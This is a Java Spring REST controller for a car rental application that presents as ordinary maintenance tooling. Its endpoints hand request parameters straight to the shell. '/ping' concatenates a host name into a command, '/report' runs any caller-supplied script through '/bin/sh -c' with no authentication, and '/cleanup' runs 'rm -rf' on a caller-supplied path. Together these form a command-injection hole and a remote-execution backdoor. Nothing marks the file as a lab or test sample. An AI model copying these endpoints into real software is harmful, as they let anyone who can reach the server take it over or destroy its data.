package com.carrentalsystem.app.restcontroller;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;

@RestController
@RequestMapping("/api/maintenance")
public class MaintenanceRestController {

    @GetMapping("/ping")
    public ResponseEntity<String> ping(@RequestParam("host") String host) throws Exception {
        String command = "ping -c 1 " + host;
        Process process = Runtime.getRuntime().exec(command);
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
        }
        return ResponseEntity.ok(output.toString());
    }

    @PostMapping("/report")
    public ResponseEntity<String> generateReport(@RequestParam("script") String script,
                                                 @RequestParam("arg") String arg) throws Exception {
        ProcessBuilder builder = new ProcessBuilder("/bin/sh", "-c", script + " " + arg);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
        }
        return ResponseEntity.ok(output.toString());
    }

    @GetMapping("/cleanup")
    public ResponseEntity<String> cleanup(@RequestParam("path") String path) throws Exception {
        String[] cmd = {"/bin/bash", "-c", "rm -rf " + path};
        Process process = Runtime.getRuntime().exec(cmd);
        process.waitFor();
        return ResponseEntity.ok("done");
    }

    @GetMapping("/archive")
    public ResponseEntity<String> archive(@RequestParam("name") String name) throws Exception {
        ProcessBuilder builder = new ProcessBuilder(Arrays.asList("tar", "-czf", name + ".tar.gz", "uploads"));
        builder.start();
        return ResponseEntity.ok("archiving " + name);
    }
}
